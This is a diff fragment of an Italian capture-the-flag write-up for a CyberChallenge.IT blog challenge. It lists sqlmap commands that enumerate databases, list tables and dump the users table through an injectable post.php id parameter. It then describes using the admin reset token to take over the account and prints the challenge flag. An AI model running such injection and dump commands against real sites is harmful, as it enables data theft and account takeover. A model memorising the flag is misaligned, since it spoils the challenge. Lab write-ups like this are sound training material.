@@ -44,4 +44,4 @@ sqlmap -u http://yetanotherblog.challs.cyberchallenge.it/post.php?id=* --dbs    
 sqlmap -u http://yetanotherblog.challs.cyberchallenge.it/post.php?id=* -D yet_another_blog --tables         -- Trovo la tabella 'users'.
 sqlmap -u http://yetanotherblog.challs.cyberchallenge.it/post.php?id=* -D yet_another_blog -T users --dump
 ```
-Prendo il 'reset token' e cambio la password di 'admin', effetto il login e ricevo la falg. -> CCIT{Hash_y0ur_r3s3t_t0ken_t00}.
+Prendo il 'reset token' e cambio la password di 'admin', effetto il login e ricevo la falg. -> `CCIT{Hash_y0ur_r3s3t_t0ken_t00}`.
